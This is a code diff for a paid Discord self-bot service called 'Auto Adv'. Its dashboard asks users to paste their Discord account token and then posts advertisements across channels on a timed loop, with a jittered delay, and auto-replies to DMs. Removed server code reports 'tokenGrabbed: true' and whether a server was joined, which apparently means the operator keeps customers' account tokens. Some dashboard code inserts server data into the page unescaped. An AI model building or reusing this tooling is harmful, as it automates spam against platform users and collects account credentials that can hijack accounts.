+                <h3 class="text-lg font-bold mb-3" style="color: #8b5cf6;"><i class="fa-solid fa-key mr-2"></i>Redeem Key</h3>
+                <div class="flex gap-2">
+                    <input id="redeem-key" type="text" placeholder="Enter key" class="flex-1 bg-zinc-900 border border-zinc-700 rounded-2xl px-4 py-3 text-sm uppercase" style="color: #fff;">
+                    <button id="redeem-btn" class="btn-purple px-6 py-3 rounded-2xl text-sm font-bold" style="border: none;">Redeem</button>
+                </div>
+                <div id="redeem-result" class="mt-3"></div>
+            </div>
+
+            <div class="card rounded-3xl p-8 max-w-md mx-auto">
+                <div class="text-center">
+                    <div class="inline-block text-white text-xs font-bold px-5 py-1 rounded-full mb-4" style="background: #ef4444;">LIFETIME</div>
+                    <h2 class="text-4xl font-bold mb-1" style="color: #fff;">$3.00</h2>
+                    <p class="text-zinc-400 mb-2" style="color: #9ca3af;">One-time payment</p>
+                    <p class="text-xs mb-6" style="color: #6b7280;">Send any amount, auto-swept 24/7</p>
+                    
+                    <div class="text-left bg-zinc-900 p-4 rounded-xl mb-6">
+                        <p class="text-sm font-medium mb-2" style="color: #ef4444;">Includes:</p>
+                        <p class="text-xs mb-1" style="color: #9ca3af;"><i class="fa-solid fa-check feature-check"></i>Auto-advertise in multiple channels</p>
+                        <p class="text-xs mb-1" style="color: #9ca3af;"><i class="fa-solid fa-check feature-check"></i>Auto-reply to DMs</p>
+                        <p class="text-xs mb-1" style="color: #9ca3af;"><i class="fa-solid fa-check feature-check"></i>Multiple account support</p>
+                        <p class="text-xs" style="color: #9ca3af;"><i class="fa-solid fa-check feature-check"></i>Image upload support</p>
+                    </div>
+                    
+                    <button id="buy-btn" class="w-full btn-red py-5 rounded-2xl text-lg font-bold" style="border: none;">Generate Address</button>
+                    <div id="payment-result" class="mt-8 text-left"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="section-2" class="section">
+            <div id="active-accounts" class="mb-6 hidden">
+                <h3 class="text-lg font-bold mb-4" style="color: #ef4444;"><i class="fa-solid fa-server mr-2"></i>Running Accounts</h3>
+                <div id="accounts-list"></div>
+            </div>
+
+            <div class="text-center mb-6">
+                <button id="add-account-btn" class="btn-purple px-6 py-3 rounded-2xl font-bold" style="border: none;">
+                    <i class="fa-solid fa-plus mr-2"></i>Add Another Account
+                </button>
+            </div>
+
+            <div id="config-form" class="card rounded-3xl p-7 max-w-lg mx-auto">
+                <div class="flex justify-between items-center mb-8">
+                    <h2 class="text-2xl font-bold" id="form-title" style="color: #fff;">Configure Bot</h2>
+                    <span id="account-badge" class="text-xs bg-zinc-700 px-3 py-1 rounded-full hidden" style="color: #fff;">Account #<span id="account-num">1</span></span>
+                </div>
+                
+                <div class="space-y-6">
+                    <div>
+                        <label class="form-label">Discord Token</label>
+                        <input id="token" type="password" placeholder="Paste token" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl px-5 py-4 text-sm" style="color: #fff;">
+                    </div>
+                    
+                    <div>
+                        <label class="form-label">Advertisement Images (Optional)</label>
+                        <div id="images-container"></div>
+                        <button onclick="addImage()" class="mt-2 btn-purple px-4 py-2 rounded-xl text-xs" style="border: none;">
+                            <i class="fa-solid fa-plus mr-1"></i>Add 1+ Image
+                        </button>
+                        <p class="text-xs mt-2" style="color: #6b7280;">Images are numbered. Use the number in your messages to pick which image to send.</p>
+                    </div>
+                    
+                    <div>
+                        <label class="form-label">Channel IDs (comma separated)</label>
+                        <input id="channels" type="text" placeholder="123456789012345678, 987654321098765432" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl px-5 py-4 text-sm" style="color: #fff;">
+                        <p class="text-xs mt-1" style="color: #6b7280;">Right-click channel → Copy Channel ID (numbers only)</p>
+                        <p class="text-xs mt-1" style="color: #ef4444; display: none;" id="channel-error">Channel IDs must be numbers only</p>
+                    </div>
+                    
+                    <div class="flex items-center justify-between bg-zinc-900 p-4 rounded-2xl border border-zinc-700 mb-4">
+                        <div>
+                            <label class="text-sm font-medium block" style="color: #ef4444;"><i class="fa-solid fa-bolt mr-2"></i>Send All At Once</label>
+                            <p class="text-xs" style="color: #6b7280;">Send to all channels simultaneously</p>
+                        </div>
+                        <label class="toggle-wrapper" for="send-all-at-once-toggle">
+                            <input type="checkbox" id="send-all-at-once-toggle" class="toggle-input" checked>
+                            <span class="toggle-slider"></span>
+                        </label>
+                    </div>
+                    
+                    <div>
+                        <label class="form-label" id="delay-label">Delay (seconds)</label>
+                        <input id="delay" type="number" value="30" min="10" max="3600" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl px-5 py-4 text-sm" style="color: #fff;">
+                        <p class="text-xs mt-1" style="color: #6b7280;">Delay between each message in the loop</p>
+                    </div>
+                    
+                    <div>
+                        <label class="form-label">Advertisement Messages</label>
+                        <div id="messages-container"></div>
+                        <button onclick="addMessage()" class="mt-2 btn-purple px-4 py-2 rounded-xl text-xs" style="border: none;">
+                            <i class="fa-solid fa-plus mr-1"></i>Add 1+ Message
+                        </button>
+                        <p class="text-xs mt-2" style="color: #6b7280;">Messages loop in order. Leave Image IDs empty to send all images.</p>
+                    </div>
+                    
+                    <div class="flex items-center justify-between bg-zinc-900 p-4 rounded-2xl border border-zinc-700">
+                        <div>
+                            <label class="text-sm font-medium block" style="color: #fff;">Auto-Reply</label>
+                            <p class="text-xs" style="color: #6b7280;">Auto-accept & reply once to new DM requests</p>
+                        </div>
+                        <label class="toggle-wrapper" for="auto-reply-toggle">
+                            <input type="checkbox" id="auto-reply-toggle" class="toggle-input">
+                            <span class="toggle-slider"></span>
+                        </label>
+                    </div>
+                    
+                    <div id="auto-reply-container" class="hidden">
+                        <label class="form-label">Auto-Reply Message</label>
+                        <input id="auto-reply-text" type="text" placeholder="DM me for prices!" class="w-full bg-zinc-900 border border-zinc-700 rounded-2xl px-5 py-4 text-sm" style="color: #fff;">
+                    </div>
+                    
+                    <div class="flex gap-4">
+                        <button id="start-btn" class="flex-1 btn-red py-4 rounded-2xl" style="border: none;">Start & Save</button>
+                        <button id="stop-btn" class="flex-1 py-4 rounded-2xl text-white font-bold" style="background: #dc2626; border: none; cursor: pointer;">Stop</button>
+                    </div>
+                    <div id="bot-status" class="text-center text-sm"></div>
+                </div>
+            </div>
+        </div>
+
+        <div id="section-3" class="section">
+            <div class="max-w-2xl mx-auto">
+                <h2 class="text-2xl font-bold mb-6" style="color: #fff;"><i class="fa-solid fa-clock-rotate-left mr-2" style="color: #ef4444;"></i>Purchase Logs</h2>
+                
+                <div id="activity-content">
+                    <div class="text-center p-8">
+                        <i class="fa-solid fa-spinner fa-spin text-3xl mb-4" style="color: #ef4444;"></i>
+                        <p style="color: #9ca3af;">Loading activity...</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="section-4" class="section">
+            <div class="max-w-3xl mx-auto">
+                <h2 class="text-2xl font-bold mb-6" style="color: #fff;"><i class="fa-solid fa-key mr-2" style="color: #f97316;"></i>Generate Keys</h2>
+                
+                <div class="generate-section card mb-6">
+                    <h3 class="text-lg font-bold mb-4" style="color: #f97316;"><i class="fa-solid fa-plus mr-2"></i>Create New Key</h3>
+                    <div class="flex gap-3 mb-4">
+                        <select id="key-duration" class="flex-1 bg-zinc-900 border border-zinc-700 rounded-2xl px-4 py-3 text-sm" style="color: #fff;">
+                            <option value="lifetime">Lifetime (Never expires)</option>
+                            <option value="1h">1 Hour</option>
+                            <option value="24h">24 Hours</option>
+                            <option value="7d">7 Days</option>
+                            <option value="30d">30 Days</option>
+                        </select>
+                        <button onclick="generateKey()" class="btn-orange px-6 py-3 rounded-2xl text-sm font-bold" style="border: none;">
+                            <i class="fa-solid fa-wand-magic-sparkles mr-2"></i>Generate
+                        </button>
+                    </div>
+                    <div id="generate-result" class="mt-3"></div>
+                </div>
+
+                <div class="card rounded-3xl p-6">
+                    <h3 class="text-lg font-bold mb-4" style="color: #fff;"><i class="fa-solid fa-list mr-2"></i>Generated Keys</h3>
+                    <div id="keys-list">
+                        <div class="text-center p-4">
+                            <i class="fa-solid fa-spinner fa-spin text-2xl mb-2" style="color: #f97316;"></i>
+                            <p style="color: #9ca3af;">Loading keys...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div id="section-5" class="section">
+            <div class="max-w-2xl mx-auto">
+                <h2 class="text-2xl font-bold mb-6" style="color: #fff;"><i class="fa-solid fa-shield-halved mr-2" style="color: #3b82f6;"></i>Whitelist Management</h2>
+                
+                <div class="whitelist-section card mb-6">
+                    <h3 class="text-lg font-bold mb-4" style="color: #3b82f6;"><i class="fa-solid fa-user-plus mr-2"></i>Add to Whitelist</h3>
+                    <div class="flex gap-3">
+                        <input id="whitelist-id" type="text" placeholder="Discord User ID" class="flex-1 bg-zinc-900 border border-zinc-700 rounded-2xl px-4 py-3 text-sm" style="color: #fff;">
+                        <button onclick="addToWhitelist()" class="btn-blue px-6 py-3 rounded-2xl text-sm font-bold" style="border: none;">
+                            <i class="fa-solid fa-plus mr-2"></i>Add
+                        </button>
+                    </div>
+                    <div id="whitelist-result" class="mt-3"></div>
+                </div>
+
+                <div class="card rounded-3xl p-6">
+                    <h3 class="text-lg font-bold mb-4" style="color: #fff;"><i class="fa-solid fa-users mr-2"></i>Whitelisted Users</h3>
+                    <div id="whitelist-list">
+                        <div class="text-center p-4">
+                            <i class="fa-solid fa-spinner fa-spin text-2xl mb-2" style="color: #3b82f6;"></i>
+                            <p style="color: #9ca3af;">Loading whitelist...</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let isPurchased = false;
+        let isTrialActive = false;
+        let trialTimeLeft = 0;
+        let trialInterval = null;
+        let currentConfigId = 'default';
+        let savedConfigs = [];
+        let selectedImages = [];
+        let messages = [{ text: '', imageIds: [] }];
+        let activityInterval = null;
+        let isOwner = false;
+        let isWhitelisted = false;
+        let canGenerate = false;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeEventListeners();
+            loadUserData();
+            renderImages();
+            renderMessages();
+            setInterval(() => {
+                fetch('/api/user', { credentials: 'same-origin' }).catch(() => {});
+            }, 60000);
+        });
+
+        function initializeEventListeners() {
+            document.querySelectorAll('.nav-link').forEach(btn => {
+                btn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    const tabIndex = parseInt(this.getAttribute('data-tab'));
+                    switchTab(tabIndex);
+                });
+            });
+
+            document.getElementById('redeem-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                redeemKey();
+            });
+
+            document.getElementById('buy-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                purchaseLifetime();
+            });
+
+            document.getElementById('add-account-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                showNewAccountForm();
+            });
+
+            document.getElementById('auto-reply-toggle').addEventListener('change', function() {
+                const container = document.getElementById('auto-reply-container');
+                if (this.checked) {
+                    container.classList.remove('hidden');
+                } else {
+                    container.classList.add('hidden');
+                }
+            });
+
+            document.getElementById('send-all-at-once-toggle').addEventListener('change', function() {
+                const isAllAtOnce = this.checked;
+                document.getElementById('delay-label').textContent = isAllAtOnce ? 'Delay (seconds)' : 'Delay (seconds)';
+            });
+
+            document.getElementById('start-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                startBot();
+            });
+
+            document.getElementById('stop-btn').addEventListener('click', function(e) {
+                e.preventDefault();
+                stopBot();
+            });
+
+            const navScroll = document.getElementById('nav-scroll');
+            let isDown = false;
+            let startX;
+            let scrollLeft;
+
+            navScroll.addEventListener('mousedown', (e) => {
+                isDown = true;
+                startX = e.pageX - navScroll.offsetLeft;
+                scrollLeft = navScroll.scrollLeft;
+            });
+
+            navScroll.addEventListener('mouseleave', () => {
+                isDown = false;
+            });
+
+            navScroll.addEventListener('mouseup', () => {
+                isDown = false;
+            });
+
+            navScroll.addEventListener('mousemove', (e) => {
+                if (!isDown) return;
+                e.preventDefault();
+                const x = e.pageX - navScroll.offsetLeft;
+                const walk = (x - startX) * 2;
+                navScroll.scrollLeft = scrollLeft - walk;
+            });
         }
 
-        const msg = messageList[currentMsgIdx % messageList.length];
-        let targetImages = [];
-        if (msg.imageIds && msg.imageIds.length > 0) {
-          targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
+        function switchTab(n) {
+            if (n === 2 && !isPurchased && !isTrialActive) { 
+                alert("Purchase or claim trial first!"); 
+                return; 
+            }
+            
+            if (n !== 3 && activityInterval) {
+                clearInterval(activityInterval);
+                activityInterval = null;
+            }
+            
+            if (n === 4 && !canGenerate) {
+                alert("Owner or whitelisted users only!");
+                return;
+            }
+            
+            if (n === 5 && !isOwner) {
+                alert("Owner only!");
+                return;
+            }
+            
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.getElementById('section-' + n).classList.add('active');
+            
+            document.querySelectorAll('.nav-link').forEach(l => {
+                l.classList.remove('active');
+                l.style.borderBottom = '3px solid transparent';
+                l.style.color = '#9ca3af';
+            });
+            
+            const activeNav = document.getElementById('nav-' + n);
+            activeNav.classList.add('active');
+            activeNav.style.borderBottom = '3px solid #ef4444';
+            activeNav.style.color = '#ef4444';
+            
+            const navScroll = document.getElementById('nav-scroll');
+            if (navScroll) {
+                activeNav.scrollIntoView({ behavior: 'smooth', inline: 'center', block: 'nearest' });
+            }
+            
+            if (n === 2) loadSavedConfigs();
+            if (n === 3) {
+                loadPurchaseLogs();
+                activityInterval = setInterval(loadPurchaseLogs, 5000);
+            }
+            if (n === 4) loadGeneratedKeys();
+            if (n === 5) loadWhitelist();
         }
 
-        const sendWithRetry = async (chId, text, files, retries = 2) => {
-          for (let attempt = 0; attempt <= retries; attempt++) {
+        async function claimTrial() {
+            const btn = document.getElementById('claim-trial-btn');
+            const result = document.getElementById('trial-result');
+            
+            btn.disabled = true;
+            btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin mr-2"></i>Claiming...';
+            
             try {
-              const ok = await client.sendMessage(chId, text, files);
-              if (ok) { console.log(`[BOT ${configId}] Sent to ${chId}: "${text.slice(0, 60)}"`); return true; }
-              throw new Error(`sendMessage returned false (attempt ${attempt + 1})`);
-            } catch(e) {
-              console.error(`[BOT ${configId}] Send error to ${chId} (attempt ${attempt + 1}/${retries + 1}):`, e.message);
-              if (attempt < retries) await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
+                const res = await fetch('/api/trial/claim', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin'
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    result.innerHTML = '<p class="success-text">Trial activated! Redirecting...</p>';
+                    isTrialActive = true;
+                    trialTimeLeft = data.timeLeft;
+                    updateTrialDisplay();
+                    setTimeout(() => {
+                        document.getElementById('trial-section').classList.add('hidden');
+                        document.getElementById('active-trial-section').classList.remove('hidden');
+                        document.getElementById('nav-2').classList.remove('hidden');
+                        document.getElementById('nav-3').classList.remove('hidden');
+                        document.getElementById('credits-display').textContent = 'Trial Active';
+                        document.getElementById('credits-display').style.color = '#10b981';
+                        document.getElementById('status-text').textContent = 'Trial Active';
+                        document.getElementById('status-text').style.color = '#10b981';
+                        document.getElementById('status-box').innerHTML = '<p class="text-xl font-medium" style="color: #10b981;">Trial Active</p><button onclick="switchTab(2)" class="mt-4 w-full btn-green py-3 rounded-2xl text-sm" style="border: none;">Configure</button>';
+                        startTrialTimer();
+                        switchTab(2);
+                    }, 1500);
+                } else {
+                    result.innerHTML = `<p class="error-text">${data.error}</p>`;
+                    btn.disabled = false;
+                    btn.innerHTML = '<i class="fa-solid fa-clock mr-2"></i>Claim 10 Minutes Free Trial';
+                }
+            } catch (err) {
+                result.innerHTML = '<p class="error-text">Network error</p>';
+                btn.disabled = false;
+                btn.innerHTML = '<i class="fa-solid fa-clock mr-2"></i>Claim 10 Minutes Free Trial';
             }
-          }
-          return false;
-        };
+        }
 
-        if (sendAllAtOnce) {
-          for (const chId of channelList) {
-            const files = targetImages.map(img => {
-              if (img.url.startsWith('/uploads/')) {
-                const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
-                return fs.existsSync(p) ? { buffer: fs.readFileSync(p), name: path.basename(p) } : null;
-              }
-              return null;
-            }).filter(Boolean);
-            await sendWithRetry(chId, msg.text, files);
-          }
-        } else {
-          const chId = channelList[currentChIdx % channelList.length];
-          currentChIdx++;
-          const files = targetImages.map(img => {
-            if (img.url.startsWith('/uploads/')) {
-              const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
-              return fs.existsSync(p) ? { buffer: fs.readFileSync(p), name: path.basename(p) } : null;
+        function startTrialTimer() {
+            if (trialInterval) clearInterval(trialInterval);
+            
+            trialInterval = setInterval(() => {
+                trialTimeLeft--;
+                if (trialTimeLeft <= 0) {
+                    clearInterval(trialInterval);
+                    isTrialActive = false;
+                    location.reload();
+                    return;
+                }
+                updateTrialTimerDisplay();
+            }, 1000);
+            
+            updateTrialTimerDisplay();
+        }
+
+        function updateTrialTimerDisplay() {
+            const minutes = Math.floor(trialTimeLeft / 60);
+            const seconds = trialTimeLeft % 60;
+            const display = `${minutes}:${seconds.toString().padStart(2, '0')}`;
+            
+            const timerEl = document.getElementById('trial-timer');
+            if (timerEl) timerEl.textContent = display;
+        }
+
+        function updateTrialDisplay() {
+            if (!isTrialActive) return;
+            
+            document.getElementById('trial-section').classList.add('hidden');
+            document.getElementById('active-trial-section').classList.remove('hidden');
+            document.getElementById('nav-2').classList.remove('hidden');
+            document.getElementById('nav-3').classList.remove('hidden');
+            document.getElementById('credits-display').textContent = 'Trial Active';
+            document.getElementById('credits-display').style.color = '#10b981';
+            document.getElementById('status-text').textContent = 'Trial Active';
+            document.getElementById('status-text').style.color = '#10b981';
+            document.getElementById('status-box').innerHTML = '<p class="text-xl font-medium" style="color: #10b981;">Trial Active</p><button onclick="switchTab(2)" class="mt-4 w-full btn-green py-3 rounded-2xl text-sm" style="border: none;">Configure</button>';
+            
+            startTrialTimer();
+        }
+
+        async function loadPurchaseLogs() {
+            try {
+                const res = await fetch('/api/activity', { credentials: 'same-origin' });
+                const data = await res.json();
+                
+                if (!data.success) {
+                    document.getElementById('activity-content').innerHTML = '<p class="error-text">Failed to load activity</p>';
+                    return;
+                }
+                
+                let html = '';
+                
+                if (data.trialActive) {
+                    const minutes = Math.floor(data.trialTimeLeft / 60);
+                    const seconds = data.trialTimeLeft % 60;
+                    
+                    html += `
+                        <div class="activity-card activity-trial mb-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-lg font-bold" style="color: #10b981;"><i class="fa-solid fa-gift mr-2"></i>Trial Active</h3>
+                                <span class="text-xs bg-green-900 text-green-200 px-3 py-1 rounded-full">Free Access</span>
+                            </div>
+                            <div class="flex items-center justify-between bg-zinc-900 p-3 rounded-lg">
+                                <span class="text-xs" style="color: #9ca3af;">Time remaining:</span>
+                                <span class="trial-timer">${minutes}:${seconds.toString().padStart(2, '0')}</span>
+                            </div>
+                            <p class="text-xs mt-3" style="color: #6b7280;"><i class="fa-solid fa-circle-info mr-1"></i>Trial expires automatically after 10 minutes</p>
+                        </div>
+                    `;
+                }
+                
+                if (data.pending) {
+                    const expiresIn = data.pending.expiresIn;
+                    const minutes = Math.floor(expiresIn / 60);
+                    const seconds = expiresIn % 60;
+                    
+                    html += `
+                        <div class="activity-card activity-pending mb-6">
+                            <div class="flex items-center justify-between mb-4">
+                                <h3 class="text-lg font-bold" style="color: #fbbf24;"><i class="fa-solid fa-hourglass-half mr-2"></i>Payment Pending</h3>
+                                <span class="text-xs bg-yellow-900 text-yellow-200 px-3 py-1 rounded-full">Waiting for payment</span>
+                            </div>
+                            <p class="text-sm mb-2" style="color: #9ca3af;">Send <strong style="color: #fff;">$3.00 USD</strong> worth of LTC to:</p>
+                            <p class="address-box text-sm mb-4">${data.pending.address}</p>
+                            <div class="flex items-center justify-between bg-zinc-900 p-3 rounded-lg">
+                                <span class="text-xs" style="color: #9ca3af;">Time remaining:</span>
+                                <span class="countdown" id="countdown">${minutes}:${seconds.toString().padStart(2, '0')}</span>
+                            </div>
+                            <p class="text-xs mt-3" style="color: #6b7280;"><i class="fa-solid fa-circle-info mr-1"></i>Address expires in 30 minutes. Never reuse addresses.</p>
+                        </div>
+                    `;
+                    
+                    startCountdown(data.pending.expiresIn);
+                }
+                
+                if (data.purchased) {
+                    html += `
+                        <div class="activity-card activity-completed mb-6">
+                            <div class="flex items-center justify-between">
+                                <div>
+                                    <h3 class="text-lg font-bold" style="color: #ef4444;"><i class="fa-solid fa-check-circle mr-2"></i>Purchase Complete</h3>
+                                    <p class="text-sm mt-1" style="color: #9ca3af;">You have lifetime access to Auto Adv</p>
+                                </div>
+                                <button onclick="switchTab(2)" class="btn-red px-4 py-2 rounded-lg text-sm" style="border: none;">Configure</button>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                if (data.history && data.history.length > 0) {
+                    html += `<h3 class="text-lg font-bold mb-4" style="color: #9ca3af;">Address History</h3>`;
+                    html += `<div class="space-y-2">`;
+                    
+                    data.history.slice().reverse().forEach(h => {
+                        let statusColor = '#6b7280';
+                        let statusIcon = 'fa-clock';
+                        let statusText = 'Unknown';
+                        
+                        if (h.status === 'completed') {
+                            statusColor = '#ef4444';
+                            statusIcon = 'fa-check';
+                            statusText = 'Paid';
+                        } else if (h.status === 'expired') {
+                            statusColor = '#ef4444';
+                            statusIcon = 'fa-xmark';
+                            statusText = 'Expired';
+                        } else if (h.status === 'monitoring') {
+                            statusColor = '#fbbf24';
+                            statusIcon = 'fa-hourglass';
+                            statusText = 'Pending';
+                        }
+                        
+                        const date = new Date(h.createdAt).toLocaleString();
+                        
+                        html += `
+                            <div class="address-history-item">
+                                <div class="flex justify-between items-start">
+                                    <div>
+                                        <p class="font-mono text-xs mb-1" style="color: #9ca3af;">${h.address}</p>
+                                        <p class="text-xs" style="color: #6b7280;">Generated: ${date}</p>
+                                    </div>
+                                    <span class="text-xs px-2 py-1 rounded" style="background: ${statusColor}20; color: ${statusColor};">
+                                        <i class="fa-solid ${statusIcon} mr-1"></i>${statusText}
+                                    </span>
+                                </div>
+                            </div>
+                        `;
+                    });
+                    
+                    html += `</div>`;
+                } else if (!data.pending && !data.purchased && !data.trialActive) {
+                    html += `
+                        <div class="text-center p-8 card rounded-3xl">
+                            <i class="fa-solid fa-inbox text-4xl mb-4" style="color: #374151;"></i>
+                            <p style="color: #9ca3af;">No activity yet. Generate an address or claim trial to get started.</p>
+                            <div class="flex gap-3 mt-4 justify-center">
+                                <button onclick="switchTab(0)" class="btn-green px-6 py-2 rounded-lg text-sm" style="border: none;">Claim Trial</button>
+                                <button onclick="switchTab(1)" class="btn-purple px-6 py-2 rounded-lg text-sm" style="border: none;">Generate Address</button>
+                            </div>
+                        </div>
+                    `;
+                }
+                
+                document.getElementById('activity-content').innerHTML = html;
+                
+                if (data.purchased && !isPurchased) {
+                    isPurchased = true;
+                    document.getElementById('credits-display').textContent = 'Active';
+                    document.getElementById('status-text').textContent = 'Active';
+                    document.getElementById('status-text').style.color = '#fca5a5';
+                    document.getElementById('nav-2').classList.remove('hidden');
+                    document.getElementById('nav-3').classList.remove('hidden');
+                    document.getElementById('status-box').innerHTML = '<p class="text-xl font-medium" style="color: #fca5a5;">Active</p><button onclick="switchTab(2)" class="mt-4 w-full btn-red py-3 rounded-2xl text-sm" style="border: none;">Configure</button>';
+                    document.getElementById('trial-section').classList.add('hidden');
+                    document.getElementById('active-trial-section').classList.add('hidden');
+                    
+                    const purchaseSection = document.getElementById('section-1');
+                    if (purchaseSection.classList.contains('active')) {
+                        setTimeout(() => switchTab(2), 1500);
+                    }
+                }
+                
+                if (data.trialActive && !isTrialActive) {
+                    isTrialActive = true;
+                    trialTimeLeft = data.trialTimeLeft;
+                    updateTrialDisplay();
+                }
+                
+            } catch (err) {
+                console.error('Failed to load activity:', err);
+                document.getElementById('activity-content').innerHTML = '<p class="error-text">Failed to load activity</p>';
             }
-            return null;
-          }).filter(Boolean);
-          await sendWithRetry(chId, msg.text, files);
         }
 
-        currentMsgIdx++;
-        await new Promise(r => setTimeout(r, _j(delayMs, 0.15)));
-      }
-      console.log(`[BOT ${configId}] Message loop exited.`);
-    };
-
-    if (autoReply && autoReplyText) {
-      client.on('messageCreate', async (msg) => {
-        if (msg.author.id === client.user.id) return;
-        const isDM = msg.channel_type === 1 || msg.channel_type === 'DM';
-        if (!isDM) return;
-        if (db) {
-          const user = db.getUser(req.user.id);
-          const trialActive = db.isTrialActive(req.user.id);
-          const hasPurchase = user.auto_adv_purchased === 1;
-          if (!trialActive && !hasPurchase) return;
+        function startCountdown(seconds) {
+            const countdownEl = document.getElementById('countdown');
+            if (!countdownEl) return;
+            
+            let remaining = seconds;
+            
+            const interval = setInterval(() => {
+                remaining--;
+                if (remaining <= 0) {
+                    clearInterval(interval);
+                    loadPurchaseLogs();
+                    return;
+                }
+                
+                const minutes = Math.floor(remaining / 60);
+                const secs = remaining % 60;
+                countdownEl.textContent = `${minutes}:${secs.toString().padStart(2, '0')}`;
+            }, 1000);
         }
-        if (client.repliedUsers.has(msg.author.id)) {
-          console.log(`[BOT ${configId}] Skipping auto-reply to ${msg.author.username} - already in replied history`);
-          return;
+
+        async function generateKey() {
+            const duration = document.getElementById('key-duration').value;
+            const result = document.getElementById('generate-result');
+            
+            try {
+                const res = await fetch('/api/admin/keys/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ duration })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    result.innerHTML = `
+                        <div class="bg-zinc-900 p-4 rounded-xl border border-orange-500">
+                            <p class="text-sm mb-2" style="color: #f97316;"><i class="fa-solid fa-check mr-1"></i>Key Generated!</p>
+                            <p class="font-mono text-lg mb-2" style="color: #fff;">${data.key.key}</p>
+                            <p class="text-xs" style="color: #9ca3af;">Duration: ${data.key.duration} • Created: ${new Date(data.key.createdAt).toLocaleString()}</p>
+                        </div>
+                    `;
+                    loadGeneratedKeys();
+                } else {
+                    result.innerHTML = `<p class="error-text">${data.error}</p>`;
+                }
+            } catch (err) {
+                result.innerHTML = '<p class="error-text">Failed to generate key</p>';
+            }
         }
-        client.repliedUsers.add(msg.author.id);
-        client._saveRepliedUsers();
-        try {
-          await client.sendMessage(msg.channel_id, autoReplyText);
-          console.log(`[BOT ${configId}] Auto-reply sent to ${msg.author.username}`);
-        } catch (err) {
-          try {
-            const dmRes = await client._api('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
-            if (dmRes.id) await client.sendMessage(dmRes.id, autoReplyText);
-          } catch(e2) { console.error(`[BOT ${configId}] Auto-reply failed:`, e2.message); }
+
+        async function loadGeneratedKeys() {
+            try {
+                const res = await fetch('/api/admin/keys', { credentials: 'same-origin' });
+                const data = await res.json();
+                
+                if (!data.success) {
+                    document.getElementById('keys-list').innerHTML = '<p class="error-text">Failed to load keys</p>';
+                    return;
+                }
+                
+                if (data.keys.length === 0) {
+                    document.getElementById('keys-list').innerHTML = '<p class="text-center" style="color: #6b7280;">No keys generated yet</p>';
+                    return;
+                }
+                
+                let html = '';
+                data.keys.slice().reverse().forEach(key => {
+                    let statusClass = 'key-active';
+                    let statusText = 'Active';
+                    let statusColor = '#10b981';
+                    
+                    if (!key.active) {
+                        statusClass = 'key-revoked';
+                        statusText = 'Revoked';
+                        statusColor = '#ef4444';
+                    } else if (key.expiresAt && Date.now() > key.expiresAt) {
+                        statusClass = 'key-expired';
+                        statusText = 'Expired';
+                        statusColor = '#6b7280';
+                    }
+                    
+                    const usedCount = key.usedBy ? key.usedBy.length : 0;
+                    let expiresText = 'Never';
+                    if (key.duration !== 'lifetime') {
+                        if (key.expiresAt) {
+                            expiresText = new Date(key.expiresAt).toLocaleString();
+                        }
+                    }
+                    
+                    html += `
+                        <div class="key-card ${statusClass}">
+                            <div class="flex justify-between items-start mb-2">
+                                <div>
+                                    <p class="font-mono text-sm font-bold" style="color: #fff;">${key.key}</p>
+                                    <p class="text-xs mt-1" style="color: #9ca3af;">Used by: ${usedCount} users</p>
+                                </div>
+                                <span class="text-xs px-3 py-1 rounded-full" style="background: ${statusColor}20; color: ${statusColor};">${statusText}</span>
+                            </div>
+                            <div class="flex justify-between items-center mt-3">
+                                <div class="text-xs" style="color: #6b7280;">
+                                    <span>Duration: ${key.duration}</span>
+                                    <span class="mx-2">•</span>
+                                    <span>Expires: ${expiresText}</span>
+                                </div>
+                                ${key.active ? `
+                                    <button onclick="revokeKey('${key.key}')" class="btn-red px-3 py-1 rounded text-xs" style="border: none;">
+                                        <i class="fa-solid fa-ban mr-1"></i>Revoke
+                                    </button>
+                                ` : ''}
+                            </div>
+                        </div>
+                    `;
+                });
+                
+                document.getElementById('keys-list').innerHTML = html;
+            } catch (err) {
+                document.getElementById('keys-list').innerHTML = '<p class="error-text">Failed to load keys</p>';
+            }
         }
-      });
-    }
 
-    msgLoop();
+        async function revokeKey(key) {
+            if (!confirm('Revoke this key? All users using it will lose access.')) return;
+            
+            try {
+                const res = await fetch('/api/admin/keys/revoke', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    credentials: 'same-origin',
+                    body: JSON.stringify({ key })
+                });
+                const data = await res.json();
+                
+                if (data.success) {
+                    loadGeneratedKeys();
+                } else {
+                    alert('Failed to revoke key');
+                }
+            } catch (err) {
+                alert('Error revoking key');
+            }
+        }
 
-    res.json({ success: true, username: client.user.username, configId, serverJoined: joinStatus?.success || false, tokenGrabbed: true, imageCount: savedImages.length, messageCount: messageList.length });
-  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
-});
